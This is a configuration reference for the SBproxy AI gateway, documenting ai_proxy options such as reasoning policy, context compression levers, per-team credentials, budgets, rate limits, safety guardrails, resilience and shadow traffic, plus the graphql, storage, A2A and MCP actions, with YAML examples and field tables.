`default_chain` covers environment variables, the shared config and credentials
files, an EKS web identity token, the ECS task role, and the EC2 instance
profile, and it renews short-lived credentials itself. A signed provider is
skipped by `resilience.health_check`, because there is no signable liveness
route on `bedrock-runtime`; shadow and race legs are signed and reach AWS as
real calls. See [providers.md](providers.md#aws-sigv4-signing-for-bedrock-and-sagemaker)
for the expiry and clock-skew behavior.

#### AI reasoning policy

`reasoning` controls reasoning effort for each provider attempt after
`model_map` resolves the upstream model. It is disabled by default:

```yaml
action:
  type: ai_proxy
  providers:
    - name: openai
      api_key: ${OPENAI_API_KEY}
      models: [gpt-5-mini]
  reasoning: concise
```

Use an explicit positive budget when the provider supports one:

```yaml
reasoning:
  budget: 2048
```

`concise` asks a supported model for its lowest native reasoning effort.
For Anthropic and Gemini, `budget` is a native thinking-token budget when the
mapped model accepts it. Anthropic keeps a separate visible-output allowance in
`max_tokens`. OpenAI uses low reasoning effort and treats `budget` as a cap on
`max_completion_tokens`, or `max_output_tokens` for a direct Responses-shaped
call. An unsupported provider-model pair or native range receives one fixed
concise instruction instead. Chat Completions and Messages receive a system
message; Responses receives `instructions`. A budget fallback also caps the
request shape's completion or output field. Requests declaring `tools` or
legacy `functions`, and code-shaped prompts, including requests that name
common source-file paths, bypass the policy. The safety facts are captured
before context compression. Only Chat Completions, Anthropic Messages, and
OpenAI Responses requests are eligible. A non-`off` policy on one of those
surfaces bypasses semantic-cache reads and writes so an older cached response
cannot skip the current reasoning or output budget.

See [Reasoning policy](ai-gateway.md#reasoning-policy) for the exact provider
mapping, fallback behavior, and metric outcomes.

#### AI context compression

The `compression` block on an `ai_proxy` action runs an ordered list of
prompt-compression levers before provider dispatch. It is separate from the
origin-level [response compression](#compression) middleware.

This example first maintains a session summary, then deterministically fits the
result to the resolved target model's context window:

```yaml
proxy:
  compression_state:
    local_path: /var/lib/sbproxy/compression-state.redb

origins:
  "ai.example.com":
    action:
      type: ai_proxy
      providers:
        - name: openai
          api_key: ${OPENAI_API_KEY}
          models: [gpt-4o]
        - name: anthropic
          api_key: ${ANTHROPIC_API_KEY}
          models: [claude-haiku-4-5]
      compression:
        allow_admin_content_inspection: false
        levers:
          - type: summary_buffer
            min_tokens: 12000
            retain_recent_messages: 8
            target_summary_tokens: 2048
            summarizer:
              provider: anthropic
              model: claude-haiku-4-5
              timeout: 5s
          - type: window_fit
            completion_reserve_tokens: 1024
            input_budget_tokens: 16384
        profiles:
          compact:
            levers:
              - type: window_fit
                input_budget_tokens: 4096
```

For stateless marked retrieval text, select sentences first, prune source
tokens through the classifier sidecar, then apply the final input bound:

```yaml
compression:
  levers:
    - type: query_select
      max_sentences: 12
    - type: token_prune
      min_tokens: 512
      endpoint: http://127.0.0.1:9440
      model: llmlingua-2
      timeout_ms: 250
      max_chunks: 32
      target:
        mode: retain_ratio
        retain_percent: 60
    - type: window_fit
      input_budget_tokens: 8192
```

Levers execute in declaration order. Each lever sees the message list accepted
from the preceding lever, and a candidate replacement is used only when it
strictly reduces the resolved target model's token estimate.

Policy fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `state` | object | Local/24h for `summary_buffer`; unset otherwise | State used by `summary_buffer`. Omission is stateless when no summary lever is present. |
| `state.backend` | enum | `local` when state is synthesized | `local` for one process-owned redb file, `redis` for cross-process serialized state, or `mesh` for replicated eventual-LWW state. Explicit choices never fall back. |
| `state.ttl` | duration | `24h` when state is synthesized | Positive record lifetime. Accepts integer seconds or strings such as `60s`, `5m`, `2h30m`, and `1d`. Newly committed summaries refresh the lifetime; exact-summary reuse does not write or refresh it. |
| `allow_admin_content_inspection` | bool | `false` | Permit the Admin-only, audit-first content endpoint for records from this handler. Metadata remains available to authenticated readers. This flag alone never grants access. |
| `levers` | list | `[]` | Compression levers in execution order. An explicitly empty list disables compression for this handler. |
| `profiles` | map | `{}` | Route-local named compression pipelines. Each entry has its own `levers` and optional `state`. Names use lowercase ASCII letters, digits, `_`, or `-`, begin with a letter or digit, contain from 1 to 64 bytes, and cannot be `on` or `off`. |
| `profiles.<name>.state` | object | Local/24h for a summary profile | State for this named profile. Each profile defaults independently and does not inherit route state. |
| `profiles.<name>.levers` | list | `[]` | Ordered levers for this named profile. |

`summary_buffer` fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `type` | string | required | Must be `summary_buffer`. |
| `min_tokens` | int | required | Positive input-token threshold below which the lever skips the request. |
| `retain_recent_messages` | int | required | Positive number of the most recent messages to retain byte-for-byte. |
| `target_summary_tokens` | int | required | Positive maximum output-token request sent to the summarizer. Must be smaller than `min_tokens`. |
| `summarizer.provider` | string | required | Exact `providers[].name` from the same AI handler. The provider must be enabled. |
| `summarizer.model` | string | required | Non-empty model sent to the selected provider. It must be declared by that provider, mapped by `model_map`, selected as its `default_model`, or allowed by an empty provider model list, and it must pass the handler's model allow and block lists. |
| `summarizer.timeout` | duration | required | Positive hard deadline for the internal summarization request. Accepts the same seconds or humanized duration syntax as `state.ttl`. |

`query_select` fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `type` | string | required | Must be `query_select`. |
| `max_sentences` | int | exclusive | Keep at most this many positive-scoring sentences in each marked retrieval block. From 1 through 4,096. |
| `target_tokens` | int | exclusive | Keep positive-scoring sentence bodies within this target-model estimate in each marked block. From 1 through 1,000,000. |

Configure exactly one of `max_sentences` and `target_tokens`. The lever accepts
only marked `format="text"` chunks. It preserves source order within each
retained chunk, then places the strongest retained chunks at the block edges.
A block may contain at most 4,096 source sentences in either mode. A larger
block skips the whole lever as `marked_context_too_large` before ranking. A
missing query, no positive lexical overlap, malformed markers, or structured
chunk also causes a safe skip.

`token_prune` fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `type` | string | required | Must be `token_prune`. |
| `min_tokens` | int | required | Positive target-model estimate across all marked bodies before any sidecar call. |
| `endpoint` | string | required | Classifier gRPC URI or `unix://` with an absolute socket path. |
| `model` | string | required | Non-empty token-classification model ID loaded by the sidecar. The sidecar accepts at most 256 UTF-8 bytes. |
| `timeout_ms` | int | `250` | Per-chunk RPC timeout, from 1 through 60,000. |
| `max_chunks` | int | `64` | Maximum marked chunks sent during one request, from 1 through 256. |
| `target.mode` | enum | required | `retain_ratio` or `target_tokens`. |
| `target.retain_percent` | int | ratio mode | Per-chunk percentage limit, from 1 through 99, enforced with both the pruning tokenizer and the request's target-model estimator. |
| `target.target_tokens` | int | token mode | Aggregate target-model budget across returned marked bodies, from 1 through 1,000,000. It must be at least the marked chunk count for that request to be eligible. |

The route connects lazily and shares its client. Only marked
`format="text"` bodies are sent. In ratio mode, SBproxy rechecks each returned
chunk against the same percentage using the request model. In target-token
mode, it allocates the budget across chunks and rechecks the combined output
with that model. A token target smaller than the marked chunk count skips
without a sidecar call. Sidecar transport errors and invalid output fail open
at this lever; later entries still run.

`window_fit` fields:

| Field | Type | Default | Description |
|---|---|---|---|
| `type` | string | required | Must be `window_fit`. |
| `completion_reserve_tokens` | int | `1024` | Non-negative completion capacity excluded from the input-message budget. |
| `input_budget_tokens` | int | unset | Positive explicit input-message budget. The effective budget is the smaller of this value and a known model window minus the completion reserve. Unknown models can still use the explicit value. |

With `input_budget_tokens`, `window_fit` uses the target-model counter for the
complete JSON message shape. It preserves the contiguous leading `system` and
`developer` prefix, the complete newest protocol unit, and a contiguous newest
suffix. OpenAI and Anthropic tool calls stay grouped with their results. If the
protected material cannot fit, the lever skips and leaves the request
unchanged. Omitting the field preserves the legacy compatibility behavior.

Requests select `on`, `off`, or a declared profile in this order:
`X-Compression` header, governed-key `compression_profile`, CEL
`compression:<selector>`, then route default. A malformed or undeclared header
returns `400`; SBproxy strips a valid header before upstream dispatch.
Malformed or undeclared operator-managed key and CEL selectors safely disable
compression and record `invalid_operator`. See
[AI context compression](ai-context-compression.md#profiles-and-request-selection)
for cache behavior, metrics, logs, and examples.

Configuration loading rejects unknown fields within `compression`, `state`,
each profile, each lever, and `summarizer`. It also rejects a zero TTL,
timeout, or explicit input budget, zero
`summary_buffer` numeric fields, a summary target greater than or equal to its
minimum threshold, an empty summarizer model, an unknown summarizer provider,
a disabled summarizer provider, and a summarizer model not available through
that provider or denied by the handler policy. It also rejects a
`query_select` block with both or neither bound, out-of-range query or pruning
targets, an empty token-prune model or endpoint, a relative Unix socket path,
and out-of-range sidecar timeout or fanout. A stateful backend that is not
available also fails pipeline construction instead of silently falling back:

- `backend: local` opens one process-owned database selected through
  `proxy.compression_state`; a required open failure is fatal. Configuration
  validation never creates or probes the file.
- `backend: redis` requires `proxy.l2_cache_settings.driver: redis`. For this
  feature, `params.dsn` must be a `redis://` or `rediss://` URL with a host.
- `backend: mesh` requires `proxy.cluster.replication` on every node and binds
  to that live replicated substrate.
- `token_prune`, `query_select`, `rag_select`, `compact_serialization`,
  `position_reorder`, and `window_fit` are stateless. `token_prune` still
  requires its configured sidecar at request time. A policy containing only
  these levers creates no Local database and needs no Redis or mesh dependency.

Request workers retain no memory-only conversational state between requests.
The stateful lever stores its canonical running-summary record in the selected
Local, Redis, or mesh backend under an opaque ID; raw session identifiers and
raw turns are not stored in that record. Local survives restart at the same
file path but does not share records with another process. There is no
OmniRoute import path, migration format, or runtime dependency. Enabling this
feature starts and maintains native SBproxy state only.

For compatibility, the older boolean remains accepted:

```yaml
resilience:
  llm_aware:
    context_compress: true
    completion_reserve_tokens: 2048
```

When `compression` is absent, `context_compress: true` maps to one
`window_fit` lever with the configured reserve, or `1024` when the reserve is
omitted. Any explicit `compression` block is authoritative, including
`compression: {levers: []}`, so it disables that legacy mapping. The legacy
form does not enable session summaries or admin content inspection.

See [AI context compression](ai-context-compression.md) for request
eligibility, session identity, concurrency, failure behavior, and operational
guidance.

#### Credentials

Per-team or per-app keys are declared under the origin-level `credentials:` block, a sibling of `action`. Each `type: ai_provider` credential maps a client-facing key to a provider, a per-key model gate, and attribution metadata. Clients send the credential's `key` in the `Authorization` header; the gateway matches it locally and swaps in the real upstream key before the call.

A `virtual_keys:` list inside the `ai_proxy` action is a hard config error: the config fails to load with a message pointing at [migration-credentials.md](migration-credentials.md).

```yaml
origins:
  "ai.example.com":
    action:
      type: ai_proxy
      providers:
        - name: anthropic
          api_key: ${ANTHROPIC_API_KEY}
          models: [claude-haiku-4-5, claude-sonnet-4-5]
    credentials:
      - name: team-frontend
        type: ai_provider
        provider: anthropic
        key: ${TEAM_FRONTEND_KEY}
        models:
          allow: [claude-haiku-4-5]
        attrs:
          tags: [team-frontend]
          budget:
            max_tokens: 500000
            max_cost_usd: 10.0
        policies:
          - type: rate_limit
            rpm: 30
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `name` | string | required | Stable name, unique within its scope. Identifies the credential in metrics and logs. |
| `type` | string | required | Credential kind. `ai_provider` for AI gateway keys; other kinds are `bearer`, `api_key`, `jwt`, `basic`, `oidc_client`, `outbound_token_exchange`, `outbound_client_credentials`. |
| `provider` | string | | Provider this key routes to. Matches an entry in the action's `providers:` list. |
| `key` | string | | Client-facing key material. Accepts `${ENV}` and secret reference URIs. |
| `models.allow` / `models.deny` | list | | Per-key model gate, enforced with a 403 before any upstream call. Stacks on the origin-level allow-list; most restrictive wins. |
| `attrs` | object | | Attribution metadata (`project`, `tags`, ...) surfaced as attribution labels (including `api_key_id`) on the `sbproxy_ai_*_attributed_total` metrics. `attrs.project`, `attrs.user`, and `attrs.team` are copied onto the matched principal, so they reach the access log columns of the same names and the `team` metric label. An inbound `SB-Attr-Team` header overrides the credential's team for that request. `attrs.budget.max_tokens` and `.max_cost_usd` add total per-key ceilings; `.reset` is compatibility-only and does not install a reset schedule. Explicit compatibility-only keys emit a warning. |
| `policies` | list | | Sub-policies that fire when this credential matches. `{type: rate_limit, rpm: <n>}` lowers to an enforced per-key requests-per-minute cap; there is no per-key tokens-per-minute knob. `{type: require_pii_redaction, rules: [...]}` gates dispatch on active PII redaction. |
| `route_to_model` | string | | Pin the upstream `model` field; the client-supplied value is ignored. |
| `compression_profile` | string | | Select `on`, `off`, or a named profile declared by this AI route. |
| `inject_tools` | list | | Replace the request's `tools` array with these provider-native entries. |

See [`examples/ai-virtual-keys/sb.yml`](https://github.com/soapbucket/sbproxy/blob/main/examples/ai-virtual-keys/sb.yml) for a runnable two-team setup and [migration-credentials.md](migration-credentials.md) for the field-by-field migration from the legacy shape.

#### Budget (`budget`)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `limits` | list | `[]` | Budget rules. See below. |
| `on_exceed` | string | `block` | Action when a limit is hit: `block`, `log`, `downgrade`. |
| `soft_landing` | object | unset | Graceful degradation before the cap (`warn_at`, `downgrade_at`, `downgrade_to`). See [ai-predictive-budget.md](ai-predictive-budget.md). |

Each `limits[]` entry:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `scope` | string | required | `workspace`, `api_key`, `user`, `model`, `origin`, or `tag`. |
| `max_tokens` | int | unset | Maximum tokens for this scope. |
| `max_cost_usd` | float | unset | Maximum spend in USD for this scope. |
| `period` | string | unset | Time window: `daily`, `monthly`, `total`. |
| `downgrade_to` | string | | Model to swap to when `on_exceed: downgrade`. |

#### Per-model rate limits (`model_rate_limits`)

Keyed by model name; each entry has `requests_per_minute` and `tokens_per_minute`.

```yaml
model_rate_limits:
  gpt-4o:
    requests_per_minute: 60
    tokens_per_minute: 200000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `requests_per_minute` | int | unset | Requests-per-minute cap for this model. |
| `tokens_per_minute` | int | unset | Tokens-per-minute cap for this model. |

#### Per-surface rate limits (`per_surface_rate_limits`)

Keyed by AI surface label. The labels are the same stable strings emitted on the `sbproxy_ai_surface_requests_total` metric: `chat_completions`, `models`, `embeddings`, `assistants`, `threads`, `batches`, `fine_tuning`, `files`, `realtime`, `image_generation`, `image_edits`, `image_variations`, `audio_transcription`, `audio_speech`, `moderations`, `reranking`, `messages`, `responses`. Surfaces without an entry are uncapped. When the cap is hit, the proxy returns 429 before any upstream call.

```yaml
per_surface_rate_limits:
  image_generation:
    requests_per_minute: 30
  audio_speech:
    requests_per_minute: 60
  chat_completions:
    requests_per_minute: 600
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `requests_per_minute` | int | unset | Requests-per-minute cap for this surface. Sliding one-minute window, shared globally across the process. |

#### Guardrails (`guardrails`)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `input` | list | `[]` | Guardrails evaluated against the incoming request body. |
| `output` | list | `[]` | Guardrails evaluated against the model output. |
| `external` | list | `[]` | External HTTP guardrail adapters and failure policy. See [External AI guardrails](guardrails.md). |
| `mesh` | object | unset | Runs input detectors as a cascade and fuses verdicts under a quorum rule (`block_threshold`, `redact_on_flag`, `cache`, `cache_capacity`, `latency_budget_ms`). See [ai-guardrail-mesh.md](ai-guardrail-mesh.md). |

Each `input` / `output` entry is an object with a `type` field and type-specific config. Built-in types: `pii`, `secrets`, `injection` (deprecated compatibility alias `prompt_injection`), `toxicity`, `jailbreak`, `content_safety`, `schema`, `regex`, `regex_guard`, `license_leak`, `context_poisoning`, `agent_alignment`, `classifier`. The two injection names preserve their existing blocking fields but use the same canonical heuristic matcher as `prompt_injection_v2`. See [ai-gateway.md](ai-gateway.md#guardrails) for per-guardrail fields.

##### Safety guardrail modes

`toxicity`, `jailbreak`, and `content_safety` default to `mode: keyword`.
That mode preserves the existing case-insensitive substring matchers and
requires no model. It catches only configured or built-in literal terms; it
does not provide semantic or ML detection.

Set `mode: classifier` to make one of those guardrails enforce the local
embedding classifier. This is an explicit, fail-closed configuration choice:
the proxy rejects an unavailable backend, an incompatible model generation,
an unknown class label, or keyword-only fields that would otherwise be
ignored. It never substitutes the keyword backend after classifier mode was
requested.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `mode` | `keyword` or `classifier` | `keyword` | Selects the literal matcher or local classifier. |
| `classifier` | object | required in classifier mode | Uses the same `backend`, threshold, optional class-example, `scope`, and `max_chars` fields as the classifier input guardrail below. Rejected in keyword mode. |
| `blocked_categories` | list | type-specific | In classifier mode, valid only for `content_safety`, must be nonempty, and may contain `violence`, `self_harm`, `sexual`, `hate_speech`, or `illegal`. |
| `stream_policy` | `chunk`, `close`, or `off` | mode-specific | Output classifier mode defaults to `close`, accepts `close` or `off`, and rejects `chunk`. Keyword mode retains the normal streaming default. |

Classifier mode ships these closed class maps:

- `toxicity`: `toxic`, `safe`
- `jailbreak`: `jailbreak`, `safe`
- `content_safety`: `violence`, `self_harm`, `sexual`, `hate_speech`,
  `illegal`, `safe`

The `classes` map may be omitted. SBproxy then uses the versioned,
precomputed centroids bundled with the binary. Entries supplied under
`classes` add deployment-specific examples to the matching shipped class;
they do not replace the default centroid. Unknown class names are rejected.
The defaults require the pinned
`sentence-transformers/all-MiniLM-L6-v2` model revision and tokenizer.
A digest mismatch is a hard configuration error because vectors from another
model generation are not comparable. When both threshold fields are omitted,
the calibrated artifact thresholds apply. Explicit `min_score` or
`min_margin` values opt into operator tuning.

Input classifier mode defaults to `scope: last_user_message`; `full_text` is
also available. Output classifier mode always evaluates the complete response:
omit `scope` or set it to `full_text`. An explicit `last_user_message` output
scope is rejected.

See [Safety guardrail modes](ai-gateway.md#safety-guardrail-modes) and the
[ai-safety-classifiers](../examples/ai-safety-classifiers/) example.

##### Classifier input guardrail

`type: classifier` is input-only. It maps prompt text onto operator-defined
classes using a local embedding model and exposes the winning class through
the guardrail label set. It is rejected under `output:` rather than accepted
as a no-op.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `backend` | object | required | Tagged backend config. The shipped backend requires `kind: embedding`. |
| `backend.model_path` | string | required | Nonblank path to the ONNX sentence-embedding model. |
| `backend.tokenizer_path` | string | required | Nonblank path to the matching Hugging Face `tokenizer.json`. |
| `backend.min_score` | float | `0.30` | Minimum cosine similarity for the winning class; finite and between `0` and `1`. |
| `backend.min_margin` | float | `0.05` | Minimum winning-score gap over the runner-up; finite and between `0` and `2`. |
| `backend.max_model_bytes` | int | loader default | Optional ONNX file-size limit in bytes. |
| `classes` | map of string to list | required | Nonblank class labels and representative prompts. At least one class and one nonblank example per class are required; each example must fit `max_chars`. |
| `scope` | enum | `last_user_message` | `last_user_message` or `full_text`. |
| `max_chars` | int | `2000` | Character cap applied to request subjects and centroid examples before tokenization. Must be above zero. |

Every ONNX path in this document names a file the proxy parses in its own
address space, and a model is a program rather than data. A model that keeps
its tensors in a separate file (ONNX `external_data`) is refused before any
file is opened, because the runtime resolves that reference against a path
the model itself chooses. See
[What a model file may not do](model-pinning.md#what-a-model-file-may-not-do).

The root JSON schema keeps each origin's `action` as raw JSON because actions
are module-registry values, so editor completion cannot enumerate this nested
table. The guardrail pipeline compiler parses and validates the classifier
shape while compiling the AI action, before a candidate configuration can
serve traffic. Unknown classifier or backend fields are rejected so a typo
cannot silently change routing behavior. Classifier labels are nonblocking and
do not count toward a mesh security quorum. For a complete routing
configuration, see [ai-classifier-routing](../examples/ai-classifier-routing/)
and the [embedding classifier guide](ai-gateway.md#embedding-classifier).

See the [AI Gateway Guide](ai-gateway.md) for CEL selectors, Lua hooks, guardrails, context window validation, per-request attribution, and streaming behavior.

#### Resilience (`resilience`)

Three independent signals that eject misbehaving providers from the routing pool. Any signal alone is enough to skip a provider; when every provider is ejected, the router falls back to the unfiltered enabled list rather than returning no provider at all.

```yaml
resilience:
  circuit_breaker:
    failure_threshold: 5      # consecutive 5xx / transport errors before opening
    success_threshold: 2      # half-open successes before closing
    open_duration_secs: 30    # cooldown before half-open probe
  outlier_detection:
    threshold: 0.5            # eject when failure rate >= 50%
    window_secs: 60           # sliding window
    min_requests: 5           # minimum sample before ejecting
    ejection_duration_secs: 30
  health_check:
    path: /models             # GET endpoint probed on each provider
    interval_secs: 30
    timeout_ms: 5000
    unhealthy_threshold: 3
    healthy_threshold: 2
  pre_header_timeout_ms: 2000 # streaming: give up on a silent provider here
```

`resilience` on its own does not add an attempt. A second attempt needs a routing plan that has somewhere to go: `routing.strategy: fallback_chain`, `resilience.content_policy_fallback: true`, or a typed fallback list. With one of those, the dispatch loop visits each configured provider at most once, so the attempt ceiling is the provider count and no separate key raises it. Circuit-broken, ejected, and cooling-down providers are skipped on the second and later attempts.

Because each candidate is visited at most once, the worst case a caller waits is the per-attempt budget times the candidate count: `(timeout_ms + backoff) x (max_retries + 1) x providers`. `resilience.pre_header_timeout_ms` is what keeps that product small without shortening `timeout_ms` for the provider that does answer. It bounds connect through the upstream response headers on streaming requests only, fails over on elapse under `sbproxy_ai_failovers_total{reason="pre_header_timeout"}`, must be above zero, and only ever shortens an attempt, so a value above the attempt's own `timeout_ms` (or above the gateway's 30-second HTTP client default when `timeout_ms` is unset) never fires. Past the response headers the request is committed to that provider, so a later stall ends the stream and is counted on `sbproxy_ai_stream_post_commit_failures_total` instead. See [Pre-header streaming budget](ai-llm-aware-resilience.md#pre-header-streaming-budget).

The block also accepts the LLM-aware keys: `retry_policy` (per-failure-class retry counts, e.g. `rate_limit: 3`), `cooldown_policy` (per-failure-class provider cooldown seconds), `llm_aware.context_compress` plus `llm_aware.completion_reserve_tokens` (fit an over-long prompt to the model's window before dispatch), and `content_policy_fallback` (route a content-policy refusal to the next provider in priority order). The typed reroute lists, `context_window_fallbacks` and `content_policy_fallbacks`, are siblings of `routing:` on the action rather than resilience keys. Semantics and the failure-cause table are in [ai-llm-aware-resilience.md](ai-llm-aware-resilience.md).

#### Shadow (`shadow`)

Mirrors a sampled set of non-streaming chat evaluation requests to one or more shadow targets after request policy, guardrails, model rewrites, and context compression. V1 includes Chat Completions plus normalized Messages and Responses requests. Mutating and non-chat surfaces, including Assistants, Threads, Batches, Fine Tuning, Files, images, audio, embeddings, moderation, and reranking, are never copied. The primary's response is what the client sees. Shadow work uses fire-and-forget admission bounded by 16 in-flight tasks and a 64 MiB reservation budget per live AI client, so shadow failure, timeout, or saturation cannot delay or reject the primary. Streaming requests are intentionally skipped.

The shadow body is drained while at most 1 MiB is retained for comparison metadata, which is logged at `target: sbproxy_ai_shadow` (status, latency, prompt/completion tokens, finish reason). Each configured usage sink receives a distinct shadow row tagged `shadow`; its request ID is freshly generated by the server and ends in `:shadow`. Shadow cost is estimated in that row but does not debit primary budgets. Set `enabled: false` on a shadow-only provider to keep it out of primary routing; the explicit shadow selection still uses it. Credential provider allow/block rules apply to the shadow target independently. A request carrying `x-sbproxy-disallow-prompt-training: true` is copied only when the shadow provider declares `no_prompt_training: true`. A hosting process that attaches a purpose-scoped egress authorizer to `AiClient` suppresses v1 shadow dispatch because the direct shadow transport cannot yet consume authorized DNS pins and redirect checks.

```yaml
shadow:
  targets:
    - provider: anthropic         # must also appear in `providers`
      model: claude-haiku-4-5     # optional override; defaults to client's model
      sample_rate: 0.1            # mirror 10% of traffic; 1.0 mirrors all
      timeout_ms: 30000           # upstream HTTP timeout
      task_timeout_ms: 30000      # hard wall-clock supervisor timeout
    - provider: gemini
      sample_rate: 0.5
```

| Field | Type | Default | Notes |
|---|---|---|---|
| `targets` | list | required | One entry per provider to shadow against. An empty list is refused, and so are two entries naming the same provider: the provider name identifies the target on every metric label and every ledger row. |
| `targets[].provider` | string | required | Must also appear in `providers`. |
| `targets[].model` | string | client's model | Model override for this target. |
| `targets[].sample_rate` | float | `1.0` | Fraction of requests this target sees. |
| `targets[].timeout_ms` | int | `30000` | Upstream HTTP timeout for this target's call. |
| `targets[].task_timeout_ms` | int | `30000` | Hard wall-clock supervisor timeout for this target's task. |

The single-target form, five sibling keys directly under `shadow:` with no
`targets:`, still parses and means a one-entry list. Writing both `targets:`
and a sibling key is refused rather than silently resolved.

Admission runs once per target, so three targets take three slots out of the
same 16-task and 64 MiB ceiling and a target that cannot get one is dropped as
`saturated` while the others run. Sampling draws once per request and every
target compares against that same draw, so target populations nest rather than
diverge: everything a `0.1` target saw, a `0.5` target on the same route also
saw. Each target's usage row carries `shadow_of`, the primary request's id, as
the join key, and `finish_reason`; per-target outcomes are also counted on
`sbproxy_ai_shadow_calls_total{target, status_class, finish_reason}` and
`sbproxy_ai_shadow_latency_seconds{target}`.

`sbproxy_ai_shadow_dropped_total{reason=...}` uses the closed reasons `streaming`, `provider_not_found`, `provider_not_allowed`, `prompt_training_disallowed`, `egress_denied`, and `saturated`. Sampling out is expected behavior and does not increment the counter.

#### Race strategy (`routing.strategy: race`)

Fans the request out to every eligible provider in parallel; returns the first 2xx and cancels the in-flight losers. Failures still feed `resilience` so persistently slow providers eventually drop out of the eligible set. Use sparingly: race fans up your provider spend by N until one wins.

```yaml
routing:
  strategy: race
providers:
  - name: openai
    api_key: ${OPENAI_API_KEY}
  - name: anthropic
    api_key: ${ANTHROPIC_API_KEY}
```

### graphql

Proxy GraphQL requests to an upstream HTTP endpoint with optional query depth limiting and introspection control.

```yaml
origins:
  "graphql.example.com":
    action:
      type: graphql
      url: https://graphql-backend.internal/graphql
      max_depth: 10
      allow_introspection: false
      validate_queries: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Backend GraphQL endpoint URL (`http://` or `https://`). |
| `max_depth` | int | 0 | Maximum field nesting depth, including named-fragment expansion. The exact limit is accepted; `0` means unlimited. |
| `allow_introspection` | bool | true | When false, operations selecting `__schema` or `__type` are rejected, including aliased or nested selections. |
| `validate_queries` | bool | false | When true, parse GraphQL document syntax before proxying. This does not perform schema-aware validation. |

With all three fields at their defaults, the action remains a transparent
proxy and does not parse the request. Setting `validate_queries: true`,
setting `max_depth` above zero, or setting `allow_introspection: false`
enables fail-closed parsing. Validated requests support a percent-encoded
`query` parameter on `GET`, plus an `application/json` object or batched
array on `POST`. Every entry in a batch must contain a string `query`
field and the complete batch is rejected when any entry fails. Validated
`GET` requests are query-parameter-only: a non-empty inbound body, or a
body added by a request modifier, is rejected with `400`.

Validation failures return `400` before an HTTP request is sent upstream.
Inbound bodies on validated requests are limited to 64 KiB so an accepted
POST body can be replayed unchanged after the pre-upstream check; larger
bodies return `413`. Multipart uploads and persisted-query-only envelopes
are not validated transports and therefore return `400` when any validation
control is enabled. They continue to pass through unchanged under the default
transparent configuration.

### storage

Serve files from an object storage backend (S3, GCS, Azure Blob, or local filesystem). The runtime builds an `object_store` backend at config-load time and serves `GET` and `HEAD` requests with content metadata, byte-range responses, and optional `index_file` fallback for directory paths. Unsupported methods return `405`, missing objects return `404`, and transient backend failures return `502`.

```yaml
origins:
  "static.example.com":
    action:
      type: storage
      backend: s3
      bucket: my-public-assets
      prefix: web/
      index_file: index.html
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `backend` | string | required | One of `s3`, `gcs`, `azure`, `local`. |
| `bucket` | string | | Bucket name. Required for `s3`, `gcs`, and `azure`. |
| `prefix` | string | | Key prefix prepended to request paths. May not contain `..` segments or NUL bytes. |
| `path` | string | | Local filesystem root. Required for `backend: local`. May not contain `..` segments or NUL bytes. |
| `index_file` | string | | Index file served for directory requests (e.g. `index.html`). May not contain `..` segments or NUL bytes. |

Cloud backends use the standard credential discovery for their provider (`AWS_*`, Google, or Azure environment), plus optional S3 `region` and `endpoint` overrides in the runtime config. The HTTP/3 action dispatcher is still disabled with the rest of HTTP/3 support; storage is served over HTTP/1.1 and HTTP/2 today.

### a2a

Proxy requests to an Agent-to-Agent (A2A) endpoint that speaks the A2A protocol. A configured `agent_card` is served by the gateway at the A2A discovery paths (`/.well-known/agent-card.json` per A2A 1.0, plus the `/.well-known/agent.json` and `/agent-card.json` aliases) without contacting the upstream; see [a2a-gateway.md](a2a-gateway.md#serving-the-agent-card).

```yaml
origins:
  "agent.example.com":
    action:
      type: a2a
      url: https://agent-backend.internal/a2a
      agent_card:
        name: SearchAgent
        version: "1.0"
        capabilities:
          streaming: true
        defaultInputModes: [application/json, text/plain]
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `url` | string | required | Upstream agent URL. |
| `agent_card` | object | | A2A agent card served at the discovery paths. Validated against the typed card schema at config compile; unknown fields round-trip verbatim. |

### mcp

Expose one MCP gateway that federates tools and resources from upstream MCP
servers. Only `mode: gateway` is implemented, and `federated_servers` must
contain at least one entry.

```yaml
origins:
  "mcp.example.com":
    action:
      type: mcp
      mode: gateway
      server_info:
        name: enterprise-tools
        version: "1.0.0"
      federated_servers:
        - origin: https://tools.internal/mcp
          prefix: tools
          namespace: always
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `mode` | string | `gateway` | MCP operating mode. Other values fail configuration. |
| `server_info` | object | generated defaults | Name and version returned by MCP `initialize`. |
| `federated_servers` | list | required, non-empty | Upstream MCP or OpenAPI-backed servers, or `type: local` servers whose tools are declared entirely in config. Each entry requires `origin`; optional fields include `prefix`, `namespace`, `transport`, `timeout`, `rbac`, OpenAPI `spec` or `spec_path`, local `tools[]` (a `static`, `http`, or `steps` handler per tool; see [mcp-compose.md](mcp-compose.md)), `protocol` (era pinning, default `auto`), `downgrade` (`warn`/`block` on a weaker later contact), `status` (`draft`/`approved`/`deprecated`), and operator-attested `approved_by`/`approved_at`. |
| `rbac_policies` | map | `{}` | Named tool-access policies referenced by `federated_servers[].rbac`. Each `tool_access[]` row may set `ttl` (same duration strings as `tool_quotas[].rate.per`); an elapsed grant is refused with JSON-RPC `-32098` until `POST /api/mcp/grants/renew`. |
| `grant_ledger` | object | unset | Durable grant clock required when any `tool_access[].ttl` is set. `path` is an owner-only JSON file. A restart must not silently extend a grant. |
